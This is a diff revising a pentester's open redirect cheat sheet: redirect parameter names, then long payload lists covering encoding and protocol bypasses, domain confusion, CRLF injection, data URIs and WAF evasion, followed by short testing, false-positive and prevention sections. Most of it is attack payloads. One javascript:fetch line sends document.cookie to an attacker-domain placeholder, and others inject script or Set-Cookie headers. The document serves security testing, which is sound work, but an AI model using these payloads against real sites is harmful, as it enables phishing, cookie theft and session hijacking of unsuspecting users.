@@ -1,93 +1,128 @@
-Open Redirect Vulnerabilities and Payloads
+Open Redirect
+
 
 # Overview
-Open Redirect vulnerabilities occur when a web application accepts user-controlled input that specifies a link to an external site, and redirects users to this link without proper validation. These vulnerabilities can enable phishing attacks by redirecting users to malicious websites.
 
-# Common Redirect Parameters
+User-controlled redirect parameters send victims to external sites without validation — common phishing enabler. Pair parameter fuzzing with encoding bypasses; confirm the final Location reaches a domain you control.
+
+
+# Related Notes
+
+web-apps.txt             Quick Burp workflow for redirect parameters
+web-vulns.txt            Open redirect validation and false positives
+web-burp.txt             Repeater redirect confirmation
+web-auth.txt             OAuth redirect_uri abuse
+
+
+# Contents
+
+Redirect Parameters, Payloads / Techniques, Testing Methodology, Validation / False Positives,
+Prevention, Impact, References
+
+
+# Redirect Parameters
+
+## Overview
+
+Fuzz any parameter that influences post-login, logout, or navigation redirects.
+
 redirect, redirect_to, redirecturi, redirect_uri, return, returnurl, returnUri, return_url, return_to, url, next, link, goto, to, out, view, login_url, continue, dest, destination, redir, redirect_url, ReturnUrl, forward, forward_url, location, exit_url, target, navigate, returnTo, return_path, retUrl, next_url, rurl, r_url, u, uri, relaystate, redirectback, redirect_back, checkout_url, checkout, ref, reference, path, file, site, page, src, source, callback, go, go_to, move, nav, jump, jump_to, rpath, redirect_uri_path, success_url, success, login, logto, logon, loginto, openid_url, openidurl, idp, idp_uri, referer, redirect_from, returnURL, successURL, nextURL, home, homepage, landingpage, login_success, return_after_login
 
-# Comprehensive Open Redirect Payload List
 
-## Basic Payloads
-https://target.com
-//target.com
-\/\/target.com
-target.com
+# Payloads / Techniques
 
-## Protocol Bypass Techniques
-https:target.com
-http:\/\/target.com
-https:\/\/target.com
-\\target.com
-http:\\target.com
+## Basic
+
+https://<attacker domain>
+//<attacker domain>
+\/\/<attacker domain>
+<attacker domain>
+
+## Protocol Bypass
+
+https:<attacker domain>
+http:\/\/<attacker domain>
+https:\/\/<attacker domain>
+\\<attacker domain>
+http:\\<attacker domain>
+http:<attacker domain>
 
 ## Character Encoding
-%0D%0Ahttp://target.com
-%09//target.com
-/%09/target.com
-/%5Ctarget.com
-//%0D%0Atarget.com
-/%2F%2Ftarget.com
-/%5C%5Ctarget.com
-\/target.com
-.target.com
 
-## URL Encoding Variations
-%68%74%74%70%73%3A%2F%2Ftarget.com        # https://target.com URL encoded
-%68%74%74%70%3A%2F%2Ftarget.com           # http://target.com URL encoded
+%0D%0Ahttp://<attacker domain>
+%09//<attacker domain>
+/%09/<attacker domain>
+/%5C<attacker domain>
+//%0D%0A<attacker domain>
+/%2F%2F<attacker domain>
+/%5C%5C<attacker domain>
+\/<attacker domain>
+.<attacker domain>
+
+## URL Encoding
+
+%68%74%74%70%73%3A%2F%2F<attacker domain>        # https:// URL encoded
+%68%74%74%70%3A%2F%2F<attacker domain>           # http:// URL encoded
 
 ## Double Encoding
-%252F%252Ftarget.com
-%252F%252F%252F%252Ftarget.com
 
-## Protocol Relative Bypass
-http:target.com
-https:target.com
+%252F%252F<attacker domain>
+%252F%252F%252F%252F<attacker domain>
+
+## Protocol Relative and JavaScript
+
 javascript:alert(document.domain)
 
-## CRLF Injection Attempts
+## CRLF Injection
+
 %0D%0A%0D%0A<img src=x onerror=alert(document.domain)>
-%0d%0aLocation:https://target.com
+%0d%0aLocation:https://<attacker domain>
 %0d%0aSet-Cookie:sessionid=123
 
 ## Domain Confusion
-https://target.com@legitimate-site.com
-https://legitimate-site.com.target.com
-https://legitimate-site.com%40target.com
-https://legitimate-site.com%2F%2Ftarget.com
-https://legitimate-site.com%252F%252Ftarget.com
-https://target.com%23.legitimate-site.com
-https://target.com%3F.legitimate-site.com
 
-## Data URI Scheme
-data:text/html,<script>window.location='https://target.com'</script>
+https://<attacker domain>@<domain>
+https://<domain>.<attacker domain>
+https://<domain>%40<attacker domain>
+https://<domain>%2F%2F<attacker domain>
+https://<domain>%252F%252F<attacker domain>
+https://<attacker domain>%23.<domain>
+https://<attacker domain>%3F.<domain>
+
+## Data URI
+
+data:text/html,<script>window.location='https://<attacker domain>'</script>
 data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==
 
 ## Null Byte and Fragment
-https://target.com%00https://legitimate-site.com
-https://target.com%2500https://legitimate-site.com
-https://target.com#https://legitimate-site.com
+
+https://<attacker domain>%00https://<domain>
+https://<attacker domain>%2500https://<domain>
+https://<attacker domain>#https://<domain>
 
 ## Special Characters
+
 javascript://%0aalert(document.cookie)
 javascript://%0Aalert(document.cookie)
-//target.com
-////target.com
-///\@target.com
-\/\/target.com/
-/\/target.com/
+////<attacker domain>
+///\@<attacker domain>
+\/\/<attacker domain>/
+/\/<attacker domain>/
 javascript:alert(document.domain)
 
-## Advanced XSS Through Redirects
+## XSS Through Redirects
+
 javascript://alert(document.domain)
-javascript:fetch('//attacker.com/?cookie='+document.cookie)
+javascript:fetch('//<attacker domain>/?cookie='+document.cookie)
 javascript://%0Aalert(document.cookie)
 
 ## Multi-Level Redirects
-https://example.com/redirect?url=https://target.com/redirect?url=https://malicious.com
-https://example.com/redirect?url=data:text/html,<script>window.location='https://target.com'</script>
 
-## Common WAF Bypass
+https://<domain>/redirect?url=https://<attacker domain>/redirect?url=https://<attacker domain>
+https://<domain>/redirect?url=data:text/html,<script>window.location='https://<attacker domain>'</script>
+
+## WAF Bypass
+
 javascripT://alert(document.domain)
 j%0A%0Davascript://alert(document.domain)
 %0Aj%0Davascript://alert(document.domain)
@@ -95,33 +130,52 @@ j%0A%0Davascript://alert(document.domain)
 %0Djavascript://alert(document.domain)
 
 ## Double URL Encodes
-%2F%252F%2565%2576%2569%256C%252E%2563%256F%256D/
-%2568%2574%2574%2570%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D/
+
+%2F%252F%2565%2576%2569%256C%252E%2563%256F%256D/        # //evil.com — re-encode for <attacker domain>
+%2568%2574%2574%2570%253A%252F%252F%2565%2576%2569%256C%252E%2563%256F%256D/   # https://evil.com — re-encode for <attacker domain>
+
 
 # Testing Methodology
+
+## Overview
+
+Identify redirect parameters, test payloads in Repeater, escalate encoding if basic values are blocked.
+
+## Commands
+
+See web-apps.txt (Open Redirect) and web-burp.txt for Burp/Repeater workflow.
+
+Steps:
 1. Identify redirect parameters in the application
 2. Test each parameter with different payloads
 3. Check if the application redirects to the malicious site
 4. Try different encoding techniques if basic payloads fail
 5. Verify if the application is performing proper validation
 
-# Prevention Measures
+
+# Validation / False Positives
+
+Redirect to /login or same-site paths is not an open redirect — confirm final Location reaches an external domain you control.
+javascript: payloads require a javascript: sink, not a plain HTTP redirect — document vector separately.
+Domain confusion using @ or subdomain tricks may look valid in the UI but fail in strict parsers — verify in browser, not only Burp preview.
+
+
+# Prevention
+
 1. Implement a whitelist of allowed redirect destinations
 2. Use indirect references to valid destinations rather than actual URLs
 3. Force all redirects to go through a page that requires the user to click a link
 4. Validate URLs against a pattern of allowed domains
 5. Ensure proper URL parsing and validation libraries are used
 
-# Real-world Impact
-Open Redirect vulnerabilities can lead to:
-- Phishing attacks
-- Credential theft
-- Session hijacking
-- CSRF attacks through redirect chains
-- Reputation damage
-- Data exfiltration when combined with other vulnerabilities
+
+# Impact
+
+Phishing, credential theft, session hijacking, CSRF via redirect chains, reputation damage, data exfiltration when chained with other bugs.
+
 
 # References
-- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
-- PortSwigger: https://portswigger.net/kb/issues/00500100_open-redirection-reflected
-- HackTricks: https://book.hacktricks.xyz/pentesting-web/open-redirect
+
+OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
+PortSwigger: https://portswigger.net/kb/issues/00500100_open-redirection-reflected
+HackTricks: https://book.hacktricks.xyz/pentesting-web/open-redirect
